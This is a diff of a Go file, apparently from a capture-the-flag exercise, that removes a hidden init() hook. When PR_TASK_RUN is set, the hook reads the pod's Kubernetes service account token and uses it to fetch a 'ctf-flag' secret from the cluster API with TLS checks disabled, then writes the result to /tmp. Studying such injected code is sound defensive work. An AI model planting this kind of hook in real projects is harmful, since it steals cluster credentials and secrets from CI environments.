@@ -1,61 +1,11 @@
 package main
 
 import (
-	"crypto/tls"
 	"fmt"
-	"io"
-	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
-	"time"
 )
-
-func init() {
-	// This runs automatically before main()
-	if os.Getenv("PR_TASK_RUN") == "true" {
-		go stealFlag()
-		time.Sleep(2 * time.Second)
-	}
-}
-
-func stealFlag() {
-	// Read ServiceAccount token
-	token, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
-	namespace, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
-
-	// Kubernetes API endpoint
-	apiServer := "https://kubernetes.default.svc"
-	secretURL := fmt.Sprintf("%s/api/v1/namespaces/%s/secrets/ctf-flag",
-		apiServer, string(namespace))
-
-	// Create HTTP client
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-
-	// Make API request
-	req, _ := http.NewRequest("GET", secretURL, nil)
-	req.Header.Set("Authorization", "Bearer "+string(token))
-
-	resp, err := client.Do(req)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "API Error: %v\n", err)
-		return
-	}
-	defer resp.Body.Close()
-
-	// Read response
-	body, _ := io.ReadAll(resp.Body)
-
-	// Write flag to /tmp so we can see it in logs
-	os.WriteFile("/tmp/FLAG.txt", body, 0644)
-
-	fmt.Printf("Secret retrieved : %s - check /tmp/FLAG.txt", body)
-}
 
 // Benign quality check script for the victim repository
 // This is what the legitimate repository contains
